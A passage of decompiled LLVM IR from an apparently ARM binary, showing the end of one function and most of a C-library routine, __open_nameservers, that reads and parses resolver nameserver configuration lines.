  store i32 %v0_1941c, i32* @global_var_2f514.923, align 4
  store i32 %v2_193e4, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  %v1_19428 = trunc i32 %v3_19418 to i8
  store i8 %v1_19428, i8* @global_var_2abdd.926, align 1
  %v1_1942c = trunc i32 %v0_19418 to i8
  store i8 %v1_1942c, i8* bitcast (i8** @global_var_2abdc.925 to i8*), align 4
  store i32 103484, i32* @lr, align 4
  %v1_19438 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_19440

dec_label_pc_19440:                               ; preds = %bb210, %bb207, %dec_label_pc_193e4
  %v0_19440 = phi i32 [ %v0_193d8, %bb210 ], [ %v0_19440.pre, %bb207 ], [ -1, %dec_label_pc_193e4 ]
  store i32 %v3_18c74, i32* @r4, align 4
  store i32 %v6_18c74, i32* @r5, align 4
  store i32 %v9_18c74, i32* @r6, align 4
  store i32 %v12_18c74, i32* @r7, align 4
  store i32 %v15_18c74, i32* @r8, align 4
  store i32 %v18_18c74, i32* @sb, align 4
  store i32 %v21_18c74, i32* @sl, align 4
  ret i32 %v0_19440

; uselistorder directives
  uselistorder i32 %v0_19418, { 1, 0 }
  uselistorder i32 %v0_193d8, { 1, 0 }
  uselistorder i1 %v7_193bc, { 1, 0 }
  uselistorder i32 %v6_19350, { 2, 6, 3, 4, 1, 5, 0 }
  uselistorder i32 %stack_var_-208.5.ph.be, { 1, 0 }
  uselistorder i32 %v0_19294, { 1, 0 }
  uselistorder i32 %stack_var_-192.0, { 6, 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-212.2, { 1, 0 }
  uselistorder i32 %v0_190e8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_191e0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_191a0, { 1, 0 }
  uselistorder i32 %v0_190c0, { 1, 0 }
  uselistorder i32 %v0_190c4, { 1, 0 }
  uselistorder i32 %v4_18fc4, { 1, 0 }
  uselistorder i32 %v1_18fac, { 1, 0, 2 }
  uselistorder i32 %v0_18f20, { 5, 0, 1, 2, 3, 4, 7, 6, 9, 8, 12, 11, 10, 14, 15, 16, 13 }
  uselistorder i32 %v1_18e8c, { 1, 0 }
  uselistorder i32 %v2_18e2c, { 1, 0 }
  uselistorder i32 %v1_18da4, { 1, 2, 0 }
  uselistorder i1 %v7_18d74, { 1, 0 }
  uselistorder i32 %stack_var_-208.567, { 2, 1, 4, 5, 3, 0 }
  uselistorder i32 %v1_18d78, { 1, 2, 0 }
  uselistorder i32 %v0_18d68, { 1, 0 }
  uselistorder i32 %v2_18cec, { 6, 7, 8, 0, 1, 2, 3, 4, 5, 9, 10, 11, 12, 13 }
  uselistorder i32* %stack_var_-236, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i8* %stack_var_-188, { 3, 2, 0, 1 }
  uselistorder i8* %stack_var_-100, { 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp155, { 2, 0, 4, 1, 3 }
  uselistorder i32 %tmp146, { 1, 0, 2 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (%pollfd*, i32, i32)* @__libc_poll, { 2, 0, 1 }
  uselistorder i32 101, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 (i32)* @inet_addr, { 1, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 1, 5, 0, 2, 4, 3 }
  uselistorder i8* @global_var_2abdd.926, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2f4fc.918 to i32), { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 512, { 3, 4, 5, 2, 6, 1, 7, 8, 9, 10, 0 }
  uselistorder i32 %arg2, { 2, 4, 5, 0, 1, 3 }
  uselistorder label %dec_label_pc_19440, { 2, 0, 1 }
  uselistorder label %bb209, { 1, 0 }
  uselistorder label %dec_label_pc_193b8, { 1, 0 }
  uselistorder label %dec_label_pc_193a8, { 6, 1, 2, 5, 4, 3, 0 }
  uselistorder label %dec_label_pc_1939c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_18d70.lr.ph.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_19388.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_192f0, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_1938c.outer.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_192bc, { 1, 0 }
  uselistorder label %bb207, { 1, 0 }
  uselistorder label %dec_label_pc_1923c, { 4, 2, 1, 3, 0 }
  uselistorder label %bb205, { 1, 0 }
  uselistorder label %dec_label_pc_19228, { 1, 0 }
  uselistorder label %dec_label_pc_19214, { 2, 0, 1 }
  uselistorder label %dec_label_pc_19210, { 1, 0 }
  uselistorder label %dec_label_pc_19178, { 1, 0, 2 }
  uselistorder label %dec_label_pc_190b4, { 1, 0 }
  uselistorder label %dec_label_pc_190a4, { 1, 0 }
  uselistorder label %dec_label_pc_1938c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_18f0c, { 1, 0 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_18e60, { 2, 0, 1 }
  uselistorder label %bb200, { 1, 0 }
}

define i32 @__open_nameservers(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_19480 = load i32, i32* @r4, align 4
  store i32 %v3_19480, i32* %stack_var_-28, align 4
  %v6_19480 = load i32, i32* @r5, align 4
  %v9_19480 = load i32, i32* @r6, align 4
  %v12_19480 = load i32, i32* @r7, align 4
  %v15_19480 = load i32, i32* @r8, align 4
  %v18_19480 = load i32, i32* @sl, align 4
  %v2_19484 = ptrtoint i32* %stack_var_-192 to i32
  %v2_19488 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_19488, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.273 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2abe0.674 to i32), i32* @r2, align 4
  %v1_1949c = call i32 @__pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2abe0.674 to i32), i32* %r0.global-to-local, align 4
  store i32 103600, i32* @lr, align 4
  %v2_194ac = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2abe0.674 to i32))
  store i32 %v2_194ac, i32* %r0.global-to-local, align 4
  %v2_194b4 = load i32, i32* @global_var_2f650.679, align 4
  %v5_194bc = icmp sgt i32 %v2_194b4, 0
  br i1 %v5_194bc, label %dec_label_pc_196f8, label %dec_label_pc_194c0

dec_label_pc_194c0:                               ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1ddac.943 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ddc0.945 to i32), i32* @r1, align 4
  %v3_194c8 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1ddac.943 to i32), i32 ptrtoint (i32* @global_var_1ddc0.945 to i32))
  store i32 %v3_194c8, i32* %r0.global-to-local, align 4
  store i32 %v3_194c8, i32* @sl, align 4
  %v2_194cc = icmp eq i32 %v3_194c8, 0
  br i1 %v2_194cc, label %dec_label_pc_194d4, label %dec_label_pc_196c0.preheader

dec_label_pc_194d4:                               ; preds = %dec_label_pc_194c0
  store i32 ptrtoint ([24 x i8]* @global_var_1ddc4.947 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1ddc0.945 to i32), i32* @r1, align 4
  %v3_194dc = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1ddc4.947 to i32), i32 ptrtoint (i32* @global_var_1ddc0.945 to i32))
  store i32 %v3_194dc, i32* %r0.global-to-local, align 4
  store i32 %v3_194dc, i32* @sl, align 4
  %v2_194e0 = icmp eq i32 %v3_194dc, 0
  br i1 %v2_194e0, label %dec_label_pc_196ec, label %dec_label_pc_196c0.preheader

dec_label_pc_196c0.preheader:                     ; preds = %dec_label_pc_194c0, %dec_label_pc_194d4
  %v0_196c826 = phi i32 [ %v3_194c8, %dec_label_pc_194c0 ], [ %v3_194dc, %dec_label_pc_194d4 ]
  %v2_19534 = ptrtoint i32* %stack_var_-28 to i32
  %v3_195d0 = inttoptr i32 %tmp to i8*
  store i32 %v2_19484, i32* %r0.global-to-local, align 4
  store i32 %v0_196c826, i32* %r2.global-to-local, align 4
  %v3_196cc66 = call i32 @fgets(i32 %v2_19484, i32 128, i32 %v0_196c826)
  store i32 %v3_196cc66, i32* %r0.global-to-local, align 4
  %v2_196d068 = icmp eq i32 %v3_196cc66, 0
  store i32 %v2_19484, i32* @r4, align 4
  br i1 %v2_196d068, label %dec_label_pc_196e0, label %dec_label_pc_194f0.preheader.lr.ph

dec_label_pc_194f0.preheader.lr.ph:               ; preds = %dec_label_pc_196c0.preheader
  %v1_194f011 = bitcast i32* %stack_var_-192 to i8*
  br label %dec_label_pc_194f0.preheader

dec_label_pc_194ec:                               ; preds = %dec_label_pc_194fc
  %v1_194ec = add i32 %v0_194ec, 1
  store i32 %v1_194ec, i32* %r0.global-to-local, align 4
  %v1_194f0 = inttoptr i32 %v1_194ec to i8*
  %v2_194f0 = load i8, i8* %v1_194f0, align 1
  %v3_194f0 = zext i8 %v2_194f0 to i32
  store i32 %v3_194f0, i32* %r2.global-to-local, align 4
  %v2_194f4 = icmp eq i8 %v2_194f0, 0
  br i1 %v2_194f4, label %dec_label_pc_19510, label %dec_label_pc_194fc

dec_label_pc_194fc:                               ; preds = %dec_label_pc_194fc.lr.ph, %dec_label_pc_194ec
  %v0_194ec = phi i32 [ %v2_19484, %dec_label_pc_194fc.lr.ph ], [ %v1_194ec, %dec_label_pc_194ec ]
  %v1_19504 = phi i32 [ %v3_194f013, %dec_label_pc_194fc.lr.ph ], [ %v3_194f0, %dec_label_pc_194ec ]
  %v3_19504 = mul nuw nsw i32 %v1_19504, 2
  %v4_19504 = add i32 %v3_19504, %v2_19500.pre
  %v5_19504 = inttoptr i32 %v4_19504 to i8*
  %v6_19504 = load i8, i8* %v5_19504, align 1
  %v1_19508 = and i8 %v6_19504, 32
  %v2_19508 = icmp eq i8 %v1_19508, 0
  br i1 %v2_19508, label %dec_label_pc_19510, label %dec_label_pc_194ec

dec_label_pc_19510:                               ; preds = %dec_label_pc_194ec, %dec_label_pc_194fc, %dec_label_pc_194f0.preheader
  %v0_195a835 = phi i32 [ %v2_19484, %dec_label_pc_194f0.preheader ], [ %v1_194ec, %dec_label_pc_194ec ], [ %v0_194ec, %dec_label_pc_194fc ]
  %v0_19524 = phi i32 [ %v3_194f013, %dec_label_pc_194f0.preheader ], [ %v3_194f0, %dec_label_pc_194ec ], [ %v1_19504, %dec_label_pc_194fc ]
  %v7_19510 = icmp eq i32 %v0_19524, 10
  br i1 %v7_19510, label %.thread3, label %bb

bb:                                               ; preds = %dec_label_pc_19510
  %v3_19514 = icmp eq i32 %v0_19524, 0
  br i1 %v3_19514, label %bb55, label %dec_label_pc_19524

.thread3:                                         ; preds = %dec_label_pc_19510
  br label %dec_label_pc_196c0.backedge

bb55:                                             ; preds = %bb
  br label %dec_label_pc_196c0.backedge

dec_label_pc_196c0.backedge:                      ; preds = %dec_label_pc_1969c, %dec_label_pc_196b4, %bb55, %dec_label_pc_19634, %.thread3, %dec_label_pc_19524
  %v0_196c8.pre = load i32, i32* @sl, align 4
  store i32 %v2_19484, i32* %r0.global-to-local, align 4
  store i32 %v0_196c8.pre, i32* %r2.global-to-local, align 4
  %v3_196cc = call i32 @fgets(i32 %v2_19484, i32 128, i32 %v0_196c8.pre)
  store i32 %v3_196cc, i32* %r0.global-to-local, align 4
  %v2_196d0 = icmp eq i32 %v3_196cc, 0
  store i32 %v2_19484, i32* @r4, align 4
  br i1 %v2_196d0, label %dec_label_pc_196e0, label %dec_label_pc_194f0.preheader

dec_label_pc_19524:                               ; preds = %bb
  %v7_19524 = icmp eq i32 %v0_19524, 35
  br i1 %v7_19524, label %dec_label_pc_196c0.backedge, label %dec_label_pc_195a8

dec_label_pc_19534:                               ; preds = %bb58
  store i32 %v2_19534, i32* %r2.global-to-local, align 4
  %v4_19538 = mul i32 %storemerge, 4
  %v5_19538 = add i32 %v4_19538, %v2_19534
  %v2_1953c = add i32 %v5_19538, -36
  %v3_1953c = inttoptr i32 %v2_1953c to i32*
  store i32 %v0_1953c, i32* %v3_1953c, align 4
  %v0_1954815 = load i32, i32* %r0.global-to-local, align 4
  %v1_1954816 = inttoptr i32 %v0_1954815 to i8*
  %v2_1954817 = load i8, i8* %v1_1954816, align 1
  %v3_1954818 = zext i8 %v2_1954817 to i32
  store i32 %v3_1954818, i32* %r2.global-to-local, align 4
  %v2_1954c19 = icmp eq i8 %v2_1954817, 0
  br i1 %v2_1954c19, label %dec_label_pc_1957c.preheader, label %dec_label_pc_19554.lr.ph

dec_label_pc_19554.lr.ph:                         ; preds = %dec_label_pc_19534
  %v2_19558.pre = load i32, i32* @global_var_2abb8, align 4
  br label %dec_label_pc_19554

dec_label_pc_19544:                               ; preds = %dec_label_pc_19568
  %v1_19544 = add i32 %v0_19544, 1
  store i32 %v1_19544, i32* %r0.global-to-local, align 4
  %v1_19548 = inttoptr i32 %v1_19544 to i8*
  %v2_19548 = load i8, i8* %v1_19548, align 1
  %v3_19548 = zext i8 %v2_19548 to i32
  store i32 %v3_19548, i32* %r2.global-to-local, align 4
  %v2_1954c = icmp eq i8 %v2_19548, 0
  br i1 %v2_1954c, label %dec_label_pc_1957c.preheader, label %dec_label_pc_19554

dec_label_pc_19554:                               ; preds = %dec_label_pc_19554.lr.ph, %dec_label_pc_19544
  %v0_19544 = phi i32 [ %v0_1954815, %dec_label_pc_19554.lr.ph ], [ %v1_19544, %dec_label_pc_19544 ]
  %v0_19568 = phi i32 [ %v3_1954818, %dec_label_pc_19554.lr.ph ], [ %v3_19548, %dec_label_pc_19544 ]
  %v3_1955c = mul nuw nsw i32 %v0_19568, 2
  %v4_1955c = add i32 %v3_1955c, %v2_19558.pre
  %v5_1955c = inttoptr i32 %v4_1955c to i8*
  %v6_1955c = load i8, i8* %v5_1955c, align 1
  %v1_19560 = and i8 %v6_1955c, 32
  %v2_19560 = icmp eq i8 %v1_19560, 0
  br i1 %v2_19560, label %dec_label_pc_19568, label %dec_label_pc_1957c.preheader

dec_label_pc_19568:                               ; preds = %dec_label_pc_19554
  %v7_19568 = icmp eq i32 %v0_19568, 10
  br i1 %v7_19568, label %dec_label_pc_1957c.preheader, label %dec_label_pc_19544

dec_label_pc_1957c.preheader:                     ; preds = %dec_label_pc_19568, %dec_label_pc_19554, %dec_label_pc_19544, %dec_label_pc_19534
  %v0_1957c20 = phi i32 [ %v0_1954815, %dec_label_pc_19534 ], [ %v0_19544, %dec_label_pc_19568 ], [ %v0_19544, %dec_label_pc_19554 ], [ %v1_19544, %dec_label_pc_19544 ]
  %v1_1957c21 = inttoptr i32 %v0_1957c20 to i8*
  %v2_1957c22 = load i8, i8* %v1_1957c21, align 1
  %v3_1957c23 = zext i8 %v2_1957c22 to i32
  store i32 %v3_1957c23, i32* %r2.global-to-local, align 4
  %v2_1958024 = icmp eq i8 %v2_1957c22, 0
  br i1 %v2_1958024, label %dec_label_pc_195a4, label %dec_label_pc_19588

dec_label_pc_19574:                               ; preds = %dec_label_pc_19588, %dec_label_pc_1959c
  %v3_19578 = inttoptr i32 %v2_19578 to i8*
  store i8 0, i8* %v3_19578, align 1
  %v4_19578 = load i32, i32* %r0.global-to-local, align 4
  %v5_19578 = add i32 %v4_19578, 1
  store i32 %v5_19578, i32* %r0.global-to-local, align 4
  %v1_1957c = inttoptr i32 %v5_19578 to i8*
  %v2_1957c = load i8, i8* %v1_1957c, align 1
  %v3_1957c = zext i8 %v2_1957c to i32
  store i32 %v3_1957c, i32* %r2.global-to-local, align 4
  %v2_19580 = icmp eq i8 %v2_1957c, 0
  br i1 %v2_19580, label %dec_label_pc_195a4, label %dec_label_pc_19588

dec_label_pc_19588:                               ; preds = %dec_label_pc_1957c.preheader, %dec_label_pc_19574
  %v0_1959c = phi i32 [ %v3_1957c, %dec_label_pc_19574 ], [ %v3_1957c23, %dec_label_pc_1957c.preheader ]
  %v2_19578 = phi i32 [ %v5_19578, %dec_label_pc_19574 ], [ %v0_1957c20, %dec_label_pc_1957c.preheader ]
  %v2_1958c = load i32, i32* @global_var_2abb8, align 4
  %v3_19590 = mul nuw nsw i32 %v0_1959c, 2
  %v4_19590 = add i32 %v2_1958c, %v3_19590
  %v5_19590 = inttoptr i32 %v4_19590 to i8*
  %v6_19590 = load i8, i8* %v5_19590, align 1
  %v1_19594 = and i8 %v6_19590, 32
  %v2_19594 = icmp eq i8 %v1_19594, 0
  br i1 %v2_19594, label %dec_label_pc_1959c, label %dec_label_pc_19574

dec_label_pc_1959c:                               ; preds = %dec_label_pc_19588
  %v7_1959c = icmp eq i32 %v0_1959c, 10
  br i1 %v7_1959c, label %dec_label_pc_19574, label %dec_label_pc_195a4

dec_label_pc_195a4:                               ; preds = %dec_label_pc_19574, %dec_label_pc_1959c, %dec_label_pc_1957c.preheader
  %v0_195a834 = phi i32 [ %v0_1957c20, %dec_label_pc_1957c.preheader ], [ %v5_19578, %dec_label_pc_19574 ], [ %v2_19578, %dec_label_pc_1959c ]
  %v0_195a4 = load i32, i32* @r8, align 4
  %v1_195a4 = add i32 %v0_195a4, 1
  br label %dec_label_pc_195a8

dec_label_pc_195a8:                               ; preds = %dec_label_pc_19524, %dec_label_pc_195a4
  %storemerge = phi i32 [ %v1_195a4, %dec_label_pc_195a4 ], [ 0, %dec_label_pc_19524 ]
  %v0_1953c = phi i32 [ %v0_195a834, %dec_label_pc_195a4 ], [ %v0_195a835, %dec_label_pc_19524 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_195a8 = inttoptr i32 %v0_1953c to i8*
  %v2_195a8 = load i8, i8* %v1_195a8, align 1
  %v3_195a8 = zext i8 %v2_195a8 to i32
  %v2_195ac = icmp eq i8 %v2_195a8, 0
  br i1 %v2_195ac, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_195a8
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_195a8, %bb56
  %v0_195bc.pr = phi i32 [ %v3_195a8, %dec_label_pc_195a8 ], [ 1, %bb56 ]
  %v1_195b4 = add i32 %storemerge, -4
  %v3_195b4 = sub i32 3, %storemerge
  %v4_195b4 = and i32 %v3_195b4, %storemerge
  %v5_195b4 = icmp slt i32 %v4_195b4, 0
  %v6_195b4 = icmp slt i32 %v1_195b4, 0
  %v7_195b4 = icmp eq i32 %storemerge, 4
  %v3_195b8 = xor i1 %v6_195b4, %v5_195b4
  %v4_195b8 = or i1 %v7_195b4, %v3_195b8
  br i1 %v4_195b8, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_195c4

bb58:                                             ; preds = %bb57
  %v2_195bc = icmp eq i32 %v0_195bc.pr, 0
  br i1 %v2_195bc, label %dec_label_pc_195c4, label %dec_label_pc_19534

dec_label_pc_195c4:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1dddc.950 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_195d0 = call i32 @__GI_strcoll(i8* %v3_195d0, i32 ptrtoint ([11 x i8]* @global_var_1dddc.950 to i32))
  store i32 %v4_195d0, i32* %r0.global-to-local, align 4
  %v2_195d4 = icmp eq i32 %v4_195d0, 0
  br i1 %v2_195d4, label %dec_label_pc_195fc.preheader, label %dec_label_pc_19620

dec_label_pc_195fc.preheader:                     ; preds = %dec_label_pc_195c4
  br label %dec_label_pc_195fc

dec_label_pc_195e4:                               ; preds = %dec_label_pc_19614
  %v1_195e4 = add i32 %v5_19604, -36
  %v2_195e4 = inttoptr i32 %v1_195e4 to i32*
  %v3_195e4 = load i32, i32* %v2_195e4, align 4
  store i32 %v3_195e4, i32* %r0.global-to-local, align 4
  %v1_195e8 = inttoptr i32 %v3_195e4 to i8*
  %v2_195e8 = call i32 @__GI_strdup(i8* %v1_195e8)
  store i32 %v2_195e8, i32* %r0.global-to-local, align 4
  %v0_195f0 = load i32, i32* @r4, align 4
  %v1_195f0 = add i32 %v0_195f0, 1
  store i32 %v1_195f0, i32* %r2.global-to-local, align 4
  %v5_195f4 = mul i32 %v0_195f0, 4
  %v6_195f4 = add i32 %v5_195f4, ptrtoint (i32* @global_var_2f644.682 to i32)
  %v7_195f4 = inttoptr i32 %v6_195f4 to i32*
  store i32 %v2_195e8, i32* %v7_195f4, align 4
  %v0_195f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_195f8 = load i32, i32* @r7, align 4
  %v2_195f8 = inttoptr i32 %v1_195f8 to i32*
  store i32 %v0_195f8, i32* %v2_195f8, align 4
  %v0_19600.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_195fc

dec_label_pc_195fc:                               ; preds = %dec_label_pc_195fc.preheader, %dec_label_pc_195e4
  %v0_1960c = phi i32 [ 1, %dec_label_pc_195fc.preheader ], [ %v0_19600.pre, %dec_label_pc_195e4 ]
  store i32 %v2_19534, i32* %r2.global-to-local, align 4
  %v1_19600 = load i32, i32* @r8, align 4
  %v2_19600 = sub i32 %v0_1960c, %v1_19600
  %v4_19600 = xor i32 %v1_19600, %v0_1960c
  %v5_19600 = xor i32 %v2_19600, %v0_1960c
  %v6_19600 = and i32 %v5_19600, %v4_19600
  %v7_19600 = icmp slt i32 %v6_19600, 0
  %v8_19600 = icmp slt i32 %v2_19600, 0
  %v4_19604 = mul i32 %v0_1960c, 4
  %v5_19604 = add i32 %v4_19604, %v2_19534
  store i32 ptrtoint (i32* @global_var_2f650.679 to i32), i32* @r7, align 4
  %v1_1960c = add i32 %v0_1960c, 1
  store i32 %v1_1960c, i32* @r5, align 4
  %v2_19610 = xor i1 %v8_19600, %v7_19600
  br i1 %v2_19610, label %dec_label_pc_19614, label %dec_label_pc_19620

dec_label_pc_19614:                               ; preds = %dec_label_pc_195fc
  %v2_19614 = load i32, i32* @global_var_2f650.679, align 4
  store i32 %v2_19614, i32* @r4, align 4
  %v7_1961c = icmp slt i32 %v2_19614, 3
  br i1 %v7_1961c, label %dec_label_pc_195e4, label %dec_label_pc_19620

dec_label_pc_19620:                               ; preds = %dec_label_pc_195fc, %dec_label_pc_19614, %dec_label_pc_195c4
  %v0_19620 = load i32, i32* @r6, align 4
  store i32 %v0_19620, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1dde8.953 to i32), i32* @r1, align 4
  %v3_19628 = inttoptr i32 %v0_19620 to i8*
  %v4_19628 = call i32 @__GI_strcoll(i8* %v3_19628, i32 ptrtoint ([7 x i8]* @global_var_1dde8.953 to i32))
  store i32 %v4_19628, i32* %r0.global-to-local, align 4
  %v2_1962c = icmp eq i32 %v4_19628, 0
  br i1 %v2_1962c, label %dec_label_pc_19664.preheader, label %dec_label_pc_19634

dec_label_pc_19634:                               ; preds = %dec_label_pc_19620
  %v0_19634 = load i32, i32* @r6, align 4
  store i32 %v0_19634, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1ddf0.955 to i32), i32* @r1, align 4
  %v3_1963c = inttoptr i32 %v0_19634 to i8*
  %v4_1963c = call i32 @__GI_strcoll(i8* %v3_1963c, i32 ptrtoint ([7 x i8]* @global_var_1ddf0.955 to i32))
  store i32 %v4_1963c, i32* %r0.global-to-local, align 4
  %v2_19640 = icmp eq i32 %v4_1963c, 0
  br i1 %v2_19640, label %dec_label_pc_19664.preheader, label %dec_label_pc_196c0.backedge

dec_label_pc_19664.preheader:                     ; preds = %dec_label_pc_19620, %dec_label_pc_19634
  store i32 ptrtoint (i32* @global_var_2f654.930 to i32), i32* @r4, align 4
  %v2_1966860 = load i32, i32* @global_var_2f654.930, align 4
  store i32 ptrtoint (i32* @global_var_2f634.934 to i32), i32* @r5, align 4
  %v1_1967463 = add i32 %v2_1966860, -1
  store i32 %v1_1967463, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_1966860, 1
  br i1 %tmp5964, label %dec_label_pc_1967c, label %dec_label_pc_1964c

dec_label_pc_1964c:                               ; preds = %dec_label_pc_19664.preheader, %dec_label_pc_1964c
  %v1_1967465 = phi i32 [ %v1_19674, %dec_label_pc_1964c ], [ %v1_1967463, %dec_label_pc_19664.preheader ]
  %v4_1964c = mul i32 %v1_1967465, 4
  %v5_1964c = add i32 %v4_1964c, ptrtoint (i32* @global_var_2f634.934 to i32)
  %v6_1964c = inttoptr i32 %v5_1964c to i32*
  %v7_1964c = load i32, i32* %v6_1964c, align 4
  store i32 %v7_1964c, i32* @r0, align 4
  store i32 %v1_1967465, i32* @global_var_2f654.930, align 4
  %v0_19654 = call i32 @free()
  store i32 %v0_19654, i32* %r0.global-to-local, align 4
  %v0_19658 = load i32, i32* @r4, align 4
  %v1_19658 = inttoptr i32 %v0_19658 to i32*
  %v2_19658 = load i32, i32* %v1_19658, align 4
  %v1_19660 = load i32, i32* @r5, align 4
  %v5_19660 = mul i32 %v2_19658, 4
  %v6_19660 = add i32 %v1_19660, %v5_19660
  %v7_19660 = inttoptr i32 %v6_19660 to i32*
  store i32 0, i32* %v7_19660, align 4
  store i32 ptrtoint (i32* @global_var_2f654.930 to i32), i32* @r4, align 4
  %v2_19668 = load i32, i32* @global_var_2f654.930, align 4
  store i32 ptrtoint (i32* @global_var_2f634.934 to i32), i32* @r5, align 4
  %v1_19674 = add i32 %v2_19668, -1
  store i32 %v1_19674, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_19668, 1
  br i1 %tmp59, label %dec_label_pc_1967c, label %dec_label_pc_1964c

dec_label_pc_1967c:                               ; preds = %dec_label_pc_1964c, %dec_label_pc_19664.preheader
  br label %dec_label_pc_1969c

dec_label_pc_19684:                               ; preds = %dec_label_pc_196b4
  %v1_19684 = add i32 %v5_196a4, -36
  %v2_19684 = inttoptr i32 %v1_19684 to i32*
  %v3_19684 = load i32, i32* %v2_19684, align 4
  store i32 %v3_19684, i32* %r0.global-to-local, align 4
  %v1_19688 = inttoptr i32 %v3_19684 to i8*
  %v2_19688 = call i32 @__GI_strdup(i8* %v1_19688)
  store i32 %v2_19688, i32* %r0.global-to-local, align 4
  %v0_19690 = load i32, i32* @r4, align 4
  %v1_19690 = add i32 %v0_19690, 1
  store i32 %v1_19690, i32* %r2.global-to-local, align 4
  %v5_19694 = mul i32 %v0_19690, 4
  %v6_19694 = add i32 %v5_19694, ptrtoint (i32* @global_var_2f634.934 to i32)
  %v7_19694 = inttoptr i32 %v6_19694 to i32*
  store i32 %v2_19688, i32* %v7_19694, align 4
  %v0_19698 = load i32, i32* %r2.global-to-local, align 4
  %v1_19698 = load i32, i32* @r6, align 4
  %v2_19698 = inttoptr i32 %v1_19698 to i32*
  store i32 %v0_19698, i32* %v2_19698, align 4
  %v0_196a0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1969c

dec_label_pc_1969c:                               ; preds = %dec_label_pc_1967c, %dec_label_pc_19684
  %v0_196ac = phi i32 [ 1, %dec_label_pc_1967c ], [ %v0_196a0.pre, %dec_label_pc_19684 ]
  store i32 %v2_19534, i32* %r2.global-to-local, align 4
  %v1_196a0 = load i32, i32* @r8, align 4
  %v2_196a0 = sub i32 %v0_196ac, %v1_196a0
  %v4_196a0 = xor i32 %v1_196a0, %v0_196ac
  %v5_196a0 = xor i32 %v2_196a0, %v0_196ac
  %v6_196a0 = and i32 %v5_196a0, %v4_196a0
  %v7_196a0 = icmp slt i32 %v6_196a0, 0
  %v8_196a0 = icmp slt i32 %v2_196a0, 0
  %v4_196a4 = mul i32 %v0_196ac, 4
  %v5_196a4 = add i32 %v4_196a4, %v2_19534
  store i32 ptrtoint (i32* @global_var_2f654.930 to i32), i32* @r6, align 4
  %v1_196ac = add i32 %v0_196ac, 1
  store i32 %v1_196ac, i32* @r5, align 4
  %v2_196b0 = xor i1 %v8_196a0, %v7_196a0
  br i1 %v2_196b0, label %dec_label_pc_196b4, label %dec_label_pc_196c0.backedge

dec_label_pc_196b4:                               ; preds = %dec_label_pc_1969c
  %v2_196b4 = load i32, i32* @global_var_2f654.930, align 4
  store i32 %v2_196b4, i32* @r4, align 4
  %v7_196bc = icmp slt i32 %v2_196b4, 4
  br i1 %v7_196bc, label %dec_label_pc_19684, label %dec_label_pc_196c0.backedge

dec_label_pc_194f0.preheader:                     ; preds = %dec_label_pc_194f0.preheader.lr.ph, %dec_label_pc_196c0.backedge
  store i32 %v2_19484, i32* %r0.global-to-local, align 4
  %v2_194f012 = load i8, i8* %v1_194f011, align 4
  %v3_194f013 = zext i8 %v2_194f012 to i32
  store i32 %v3_194f013, i32* %r2.global-to-local, align 4
  %v2_194f414 = icmp eq i8 %v2_194f012, 0
  br i1 %v2_194f414, label %dec_label_pc_19510, label %dec_label_pc_194fc.lr.ph

dec_label_pc_194fc.lr.ph:                         ; preds = %dec_label_pc_194f0.preheader
  %v2_19500.pre = load i32, i32* @global_var_2abb8, align 4
  br label %dec_label_pc_194fc

dec_label_pc_196e0:                               ; preds = %dec_label_pc_196c0.backedge, %dec_label_pc_196c0.preheader
  %v0_196e0 = load i32, i32* @sl, align 4
  store i32 %v0_196e0, i32* %r0.global-to-local, align 4
